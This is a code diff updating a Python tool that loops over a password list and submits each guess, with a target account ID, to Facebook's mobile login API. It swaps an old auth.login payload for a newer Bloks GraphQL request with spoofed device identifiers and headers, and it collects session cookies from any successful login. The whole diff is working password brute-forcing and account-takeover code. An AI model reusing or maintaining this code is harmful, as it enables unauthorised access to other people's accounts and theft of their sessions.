@@ -246,27 +246,99 @@ class System:
         try:
             for pas in passlist:
                 data = {
-                'adid': str(uuid.uuid4()),
-                'format': 'json',
-                'device_id': str(uuid.uuid4()),
-                'cpl': 'true',
-                'family_device_id': str(uuid.uuid4()),
-                'credentials_type': 'device_based_login_password',
-                'error_detail_type': 'button_with_disabled',
-                'source': 'device_based_login',
-                'email': ids,
-                'password': pas,
-                'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
-                'generate_session_cookies': '1',
-                'meta_inf_fbmeta': '',
-                'advertiser_id': str(uuid.uuid4()),
-                'currently_logged_in_userid': '0',
-                'locale': 'en_US',
-                'client_country_code': 'US',
-                'method': 'auth.login',
-                'fb_api_req_friendly_name': 'authenticate',
-                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
-                'api_key': '882a8490361da98702bf97a021ddc14d'}
+    'method': 'post',
+    'pretty': 'false',
+    'format': 'json',
+    'server_timestamps': 'true',
+    'locale': '-',
+    'purpose': 'fetch',
+    'fb_api_req_friendly_name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request',
+    'fb_api_caller_class': 'graphservice',
+    'client_doc_id': '11994080424240083948543644217',
+    'variables': json.dumps({
+        "params": {
+            "params": json.dumps({
+                "client_input_params": json.dumps({
+                    "sim_phones": [],
+                    "secure_family_device_id": str(uuid.uuid4()),
+                    "auth_secure_device_id": "",
+                    "has_whatsapp_installed": 1,
+                    "password": "#PWD_FB4A:0:{}:{}".format(int(time.time()), pas),
+                    "sso_token_map_json_string": "",
+                    "event_flow": "login_manual",
+                    "sim_serials": [],
+                    "client_known_key_hash": "",
+                    "encrypted_msisdn": "",
+                    "should_show_nested_nta_from_aymh": 0,
+                    "device_id": str(uuid.uuid4()),
+                    "login_attempt_count": 1,
+                    "machine_id": "btqmzg6mx6h3dr2bnwn82yvj",
+                    "flash_call_permission_status": json.dumps({
+                        "READ_PHONE_STATE": "DENIED",
+                        "READ_CALL_LOG": "DENIED",
+                        "ANSWER_PHONE_CALLS": "DENIED"
+                    }),
+                    "accounts_list": [],
+                    "family_device_id": str(uuid.uuid4()),
+                    "fb_ig_device_id": [],
+                    "device_emails": [],
+                    "try_num": 3,
+                    "lois_settings": json.dumps({
+                        "lois_token": "",
+                        "lara_override": ""
+                    }),
+                    "event_step": "home_page",
+                    "headers_infra_flow_id": "",
+                    "openid_tokens": {},
+                    "contact_point": ids
+                }),
+                "server_params": json.dumps({
+                    "should_trigger_override_login_2fa_action": 0,
+                    "is_from_logged_out": 0,
+                    "should_trigger_override_login_success_action": 0,
+                    "login_credential_type": "none",
+                    "server_login_source": "login",
+                    "waterfall_id": str(uuid.uuid4()),
+                    "login_source": "Login",
+                    "is_platform_login": 0,
+                    "pw_encryption_try_count": 1,
+                    "INTERNALlatency_qpl_marker_id": 36707139,
+                    "offline_experiment_group": "caa_iteration_v6_perf_fb_2",
+                    "is_from_landing_page": 0,
+                    "password_text_input_id": "5tm5yt:28",
+                    "is_from_empty_password": 0,
+                    "ar_event_source": "login_home_page",
+                    "username_text_input_id": "zfiojk:27",
+                    "layered_homepage_experiment_group": "",
+                    "device_id": str(uuid.uuid4()),
+                    "INTERNALlatency_qpl_instance_id": "0.7186605966306517",
+                    "reg_flow_source": "login_home_native_integration_point",
+                    "is_caa_perf_enabled": 1,
+                    "credential_type": "password",
+                    "is_from_password_entry_page": 0,
+                    "caller": "gslr",
+                    "family_device_id": str(uuid.uuid4()),
+                    "INTERNAL_INFRA_THEME": "harm_f,default,harm_f",
+                    "is_from_assistive_id": 0,
+                    "access_flow_version": "F2_FLOW",
+                    "is_from_logged_in_switcher": 0
+                })
+            }),
+            "bloks_versioning_id": "c459b951c037ad3fbe67f94342f309a73154e66c326b3cd823682078d9eeb722",
+            "app_id": "com.bloks.www.bloks.caa.login.async.send_login_request"
+        },
+        "scale": "47",
+        "nt_context": json.dumps({
+            "using_white_navbar": "True",
+            "pixel_ratio": 3,
+            "is_push_on": "False",
+            "styles_id": "196702b4d5dfb9dbf1ded6d58ee42767",
+            "bloks_version": "c459b951c037ad3fbe67f94342f309a73154e66c326b3cd823682078d9eeb722"
+        })
+    }),
+    'fb_api_analytics_tags': '["GraphServices"]',
+    'client_trace_id': str(uuid.uuid4())
+}
                 headers = {
                 'Content-Type': 'application/x-www-form-urlencoded',
                 'Host': 'b-graph.facebook.com',
@@ -285,7 +357,7 @@ class System:
                 'X-FB-Server-Cluster': 'True',
                 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                 'Connection': 'Keep-Alive'}
-                login_url = "https://api.facebook.com/auth/login"
+                login_url = "https://graph.facebook.com/graphql?method=post&pretty=false&format=json&server_timestamps=true&locale=-&purpose=fetch&fb_api_req_friendly_name=FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request&fb_api_caller_class=graphservice&client_doc_id=11994080424240083948543644217&variables=%7B%22params%22%3A+%7B%22params%22%3A+%22%7B%5C%22client_input_params%5C%22%3A+%5C%22%7B%5C%5C%5C%22sim_phones%5C%5C%5C%22%3A+%5B%5D%2C+%5C%5C%5C%22secure_family_device_id%5C%5C%5C%22%3A+%5C%5C%5C%22b9a61626-fa7c-4861-8767-c1e6da01c6dc%5C%5C%5C%22%2C+%5C%5C%5C%22auth_secure_device_id%5C%5C%5C%22%3A+%5C%5C%5C%22%5C%5C%5C%22%2C+%5C%5C%5C%22has_whatsapp_installed%5C%5C%5C%22%3A+1%2C+%5C%5C%5C%22password%5C%5C%5C%22%3A+%5C%5C%5C%22%23PWD_FB4A%3A0%3A1750684174%3A838394%5C%5C%5C%22%2C+%5C%5C%5C%22sso_token_map_json_string%5C%5C%5C%22%3A+%5C%5C%5C%22%5C%5C%5C%22%2C+%5C%5C%5C%22event_flow%5C%5C%5C%22%3A+%5C%5C%5C%22login_manual%5C%5C%5C%22%2C+%5C%5C%5C%22sim_serials%5C%5C%5C%22%3A+%5B%5D%2C+%5C%5C%5C%22client_known_key_hash%5C%5C%5C%22%3A+%5C%5C%5C%22%5C%5C%5C%22%2C+%5C%5C%5C%22encrypted_msisdn%5C%5C%5C%22%3A+%5C%5C%5C%22%5C%5C%5C%22%2C+%5C%5C%5C%22should_show_nested_nta_from_aymh%5C%5C%5C%22%3A+0%2C+%5C%5C%5C%22device_id%5C%5C%5C%22%3A+%5C%5C%5C%22e5603942-884b-4fe6-92d5-91a9f20a4860%5C%5C%5C%22%2C+%5C%5C%5C%22login_attempt_count%5C%5C%5C%22%3A+1%2C+%5C%5C%5C%22machine_id%5C%5C%5C%22%3A+%5C%5C%5C%2293zxslwjtb7qizoe21we910k%5C%5C%5C%22%2C+%5C%5C%5C%22flash_call_permission_status%5C%5C%5C%22%3A+%5C%5C%5C%22%7B%5C%5C%5C%5C%5C%5C%5C22READ_PHONE_STATE%5C%5C%5C%5C%5C%5C%5C%22%3A+%5C%5C%5C%5C%5C%5C%5C%22DENIED%5C%5C%5C%5C%5C%5C%5C%22%2C+%5C%5C%5C%5C%5C%5C%5C%22READ_CALL_LOG%5C%5C%5C%5C%5C%5C%5C%22%3A+%5C%5C%5C%5C%5C%5C%5C%22DENIED%5C%5C%5C%5C%5C%5C%5C%22%2C+%5C%5C%5C%5C%5C%5C%5C%22ANSWER_PHONE_CALLS%5C%5C%5C%5C%5C%5C%5C%22%3A+%5C%5C%5C%5C%5C%5C%5C%22DENIED%5C%5C%5C%5C%5C%5C%5C%22%7D%5C%5C%5C%22%2C+%5C%5C%5C%22accounts_list%5C%5C%5C%22%3A+%5B%5D%2C+%5C%5C%5C%22family_device_id%5C%5C%5C%22%3A+%5C%5C%5C%2283914afd-9840-47b5-9210-b2b96234b0e3%5C%5C%5C%22%2C+%5C%5C%5C%22fb_ig_device_id%5C%5C%5C%22%3A+%5B%5D%2C+%5C%5C%5C%22device_emails%5C%5C%5C%22%3A+%5B%5D%2C+%5C%5C%5C%22try_num%5C%5C%5C%22%3A+3%2C+%5C%5C%5C%22lois_settings%5C%5C%5C%22%3A+%5C%5C%5C%22%7B%5C%5C%5C%5C%5C%5C%5C%22lois_token%5C%5C%5C%5C%5C%5C%5C%22%3A+%5C%5C%5C%5C%5C%5C%5C%22%5C%5C%5C%5C%5C%5C%5C%22%2C+%5C%5C%5C%5C%5C%5C%5C%22lara_override%5C%5C%5C%5C%5C%5C%5C%22%3A+%5C%5C%5C%5C%5C%5C%5C%22%5C%5C%5C%5C%5C%5C%5C%22%7D%5C%5C%5C%22%2C+%5C%5C%5C%22event_step%5C%5C%5C%22%3A+%5C%5C%5C%22home_page%5C%5C%5C%22%2C+%5C%5C%5C%22headers_infra_flow_id%5C%5C%5C%22%3A+%5C%5C%5C%22%5C%5C%5C%22%2C+%5C%5C%5C%22openid_tokens%5C%5C%5C%22%3A+%7B%7D%2C+%5C%5C%5C%22contact_point%5C%5C%5C%22%3A+%5C%5C%5C%228383941953%5C%5C%5C%22%7D%5C%22%2C+%22server_params%22%3A+%5C%22%7B%5C%5C%5C%22should_trigger_override_login_2fa_action%5C%5C%5C%22%3A+0%2C+%5C%5C%5C%22is_from_logged_out%5C%5C%5C%22%3A+0%2C+%5C%5C%5C%22should_trigger_override_login_success_action%5C%5C%5C%22%3A+0%2C+%5C%5C%5C%22login_credential_type%5C%5C%5C%22%3A+%5C%5C%5C%22none%5C%5C%5C%22%2C+%5C%5C%5C%22server_login_source%5C%5C%5C%22%3A+%5C%5C%5C%22login%5C%5C%5C%22%2C+%5C%5C%5C%22waterfall_id%5C%5C%5C%22%3A+%5C%5C%5C%22fb23d1ca-e80a-46b4-8577-6546ec37d40a%5C%5C%5C%22%2C+%5C%5C%5C%22login_source%5C%5C%5C%22%3A+%5C%5C%5C%22Login%5C%5C%5C%22%2C+%5C%5C%5C%22is_platform_login%5C%5C%5C%22%3A+0%2C+%5C%5C%5C%22pw_encryption_try_count%5C%5C%5C%22%3A+1%2C+%5C%5C%5C%22INTERNAL__latency_qpl_marker_id%5C%5C%5C%22%3A+36707139%2C+%5C%5C%5C%22offline_experiment_group%5C%5C%5C%22%3A+%5C%5C%5C%22caa_iteration_v6_perf_fb_2%5C%5C%5C%22%2C+%5C%5C%5C%22is_from_landing_page%5C%5C%5C%22%3A+0%2C+%5C%5C%5C%22password_text_input_id%5C%5C%5C%22%3A+%5C%5C%5C%22pijnxb%3A28%5C%5C%5C%22%2C+%5C%5C%5C%22is_from_empty_password%5C%5C%5C%22%3A+0%2C+%5C%5C%5C%22ar_event_source%5C%5C%5C%22%3A+%5C%5C%5C%22login_home_page%5C%5C%5C%22%2C+%5C%5C%5C%22username_text_input_id%5C%5C%5C%22%3A+%5C%5C%5C%22o7i143%3A62%5C%5C%5C%22%2C+%5C%5C%5C%22layered_homepage_experimnt_group%5C%5C%5C%22%3A+%5C%5C%5C%22%5C%5C%5C%22%2C+%5C%5C%5C%22device_id%5C%5C%5C%22%3A+%5C%5C%5C%22f636f5ad-e27e-464d-96af-cdc57ee227e8%5C%5C%5C%22%2C+%5C%5C%5C%22INTERNAL__latency_qpl_instance_id%5C%5C%5C%22%3A+%5C%5C%5C%220.5827769600175628%5C%5C%5C%22%2C+%5C%5C%5C%22reg_flow_source%5C%5C%5C%22%3A+%5C%5C%5C%22login_home_native_integration_point%5C%5C%5C%22%2C+%5C%5C%5C%22is_caa_perf_enabled%5C%5C%5C%22%3A+1%2C+%5C%5C%5C%22credential_type%5C%5C%5C%22%3A+%5C%5C%5C%22password%5C%5C%5C%22%2C+%5C%5C%5C%22is_from_password_entry_page%5C%5C%5C%22%3A+0%2C+%5C%5C%5C%22caller%5C%5C%5C%22%3A+%5C%5C%5C%22gslr%5C%5C%5C%22%2C+%5C%5C%5C%22family_device_id%5C%5C%5C%22%3A+%5C%5C%5C%22556c8fb8-0b9a-49d0-8d23-002972ac7e25%5C%5C%5C%22%2C+%5C%5C%5C%22INTERNAL_INFRA_THEME%5C%5C%5C%22%3A+%5C%5C%5C%22harm_f%2Cdefault%2Charm_f%5C%5C%5C%22%2C+%5C%5C%5C%22is_from_assistive_id%5C%5C%5C%22%3A+0%2C+%5C%5C%5C%22access_flow_version%5C%5C%5C%22%3A+%5C%5C%5C%22F2_FLOW%5C%5C%5C%22%2C+%5C%5C%5C%22is_from_logged_in_switcher%5C%5C%5C%22%3A+0%7D%5C%22%7D%22%2C+%22bloks_versioning_id%22%3A+%22c459b951c037ad3fbe67f94342f309a73154e66c326b3cd823682078d9eeb722%22%2C+%22app_id%22%3A+%22com.bloks.www.bloks.caa.login.async.send_login_request%22%7D%2C+%22scale%22%3A+%2261%22%2C+%22nt_context%22%3A+%22%7B%5C%22using_white_navbar%5C%22%3A+%5C%22True%5C%22%2C+%5C%22pixel_ratio%5C%22%3A+3%2C+%5C%22is_push_on%5C%22%3A+%5C%5C%5C%22False%5C%22%2C+%5C%22styles_id%5C%22%3A+%5C%22196702b4d5dfb9dbf1ded6d58ee42767%5C%22%2C+%5C%22bloks_version%5C%22%3A+%5C%22c459b951c037ad3fbe67f94342f309a73154e66c326b3cd823682078d9eeb722%5C%22%7D%22%7D&fb_api_analytics_tags=%5B%22GraphServices%22%5D&client_trace_id=53c1be29-01f1-4f88-bbdf-8055602f1c81"
                 response = ses.post(url=login_url, data=data, headers=headers, allow_redirects=False).json()
                 if "session_key" in response:
                     kuki = ";".join(i["name"]+"="+i["value"] for i in response["session_cookies"])
